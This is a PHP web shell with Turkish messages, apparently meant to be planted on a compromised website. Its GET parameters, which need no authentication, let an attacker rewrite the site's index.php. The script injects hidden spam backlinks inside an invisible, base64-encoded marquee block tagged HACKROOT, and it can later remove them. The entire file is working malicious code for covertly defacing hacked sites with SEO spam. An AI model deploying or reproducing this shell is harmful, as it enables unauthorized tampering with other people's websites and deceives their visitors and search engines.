<?php
if (!isset($_GET['cmd'])) {
    die('Shell hazır.');
}

$cmd = $_GET['cmd'];
$target_file = '../index.php';

$link = isset($_GET['url']) ? $_GET['url'] : '';
$keyword = isset($_GET['keyword']) ? $_GET['keyword'] : '';

if ($cmd === 'addlink' && $link !== '' && $keyword !== '') {
    $content = @file_get_contents($target_file);
    if ($content === false) {
        die('oc-load.php okunamadı.');
    }

    $start_tag = '/*HACKROOT-START*/';
    $end_tag = '/*HACKROOT-END*/';

    $new_link = "<a href='$link' title='$keyword'>$keyword</a>";

    $pattern = '/base64_decode\([\'"](.+?)[\'"]\)/';

    if (strpos($content, $start_tag) !== false && strpos($content, $end_tag) !== false) {
        // Aradaki base64 içeriği decode et, yeni linki ekle, sonra tekrar encode et
        preg_match($pattern, $content, $match);
        $decoded = base64_decode($match[1]);
        $decoded = str_replace('</marquee>', ', ' . $new_link . '</marquee>', $decoded);
        $new_encoded = base64_encode($decoded);

        $content = preg_replace($pattern, "base64_decode('$new_encoded')", $content);
    } else {
        // İlk ekleme
        $marquee = "<div style='position:absolute;width:1px;height:1px;overflow:hidden;opacity:0;pointer-events:none;'><marquee>$new_link</marquee></div>";
        $encoded = base64_encode($marquee);
        $injection = "\n<?php /*HACKROOT-START*/ echo base64_decode('$encoded'); /*HACKROOT-END*/ ?>\n";

        if (preg_match('/<\/body>|<\/html>/i', $content)) {
            $content = preg_replace('/(<\/body>|<\/html>)/i', $injection . "$1", $content, 1);
        } else {
            $content = $injection . $content;
        }
    }

    if (file_put_contents($target_file, $content) !== false) {
        echo "Backlink eklendi.";
    } else {
        echo "Dosyaya yazılamadı.";
    }
    exit;
}

if ($cmd === 'removelink' && $link !== '') {
    $content = @file_get_contents($target_file);
    if ($content === false) {
        die('oc-load.php okunamadı.');
    }

    $pattern = '/base64_decode\([\'"](.+?)[\'"]\)/';
    if (preg_match($pattern, $content, $match)) {
        $decoded = base64_decode($match[1]);

        // URL'ye göre linki sil
        $decoded = preg_replace("~<a href='$link'[^>]*>.*?</a>~", '', $decoded);

        // Boş marquee varsa temizle
        $decoded = preg_replace('/<marquee>\s*<\/marquee>/', '', $decoded);

        $new_encoded = base64_encode($decoded);
        $content = preg_replace($pattern, "base64_decode('$new_encoded')", $content);

        if (file_put_contents($target_file, $content) !== false) {
            echo "Backlink silindi.";
        } else {
            echo "Dosyaya yazılamadı.";
        }
    } else {
        echo "Encoded içerik bulunamadı.";
    }
    exit;
}

echo "Geçersiz komut.";
?>
